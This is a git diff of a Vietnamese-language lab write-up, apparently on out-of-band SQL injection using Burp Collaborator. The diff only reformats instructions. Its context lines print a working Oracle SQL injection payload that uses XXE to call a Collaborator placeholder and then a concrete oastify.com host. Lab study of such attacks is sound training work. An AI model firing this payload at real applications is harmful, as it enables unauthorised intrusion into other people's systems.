@@ -14,8 +14,11 @@ Ta sử dụng payload:
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLLABORATOR_SUBDOMAIN">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 Phần Burp Collaborator subdomain ta có thể mở ở mục `Burp Collaborator`:
--Bấm `Get Started`
--Bấm Copy Link
+
+Bấm `Get Started`
+
+Bấm Copy Link
+
 => Ta được payload:
 ```SQL
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//1rt3n2x0luxhh9ehvno7doiwyn4es5gu.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
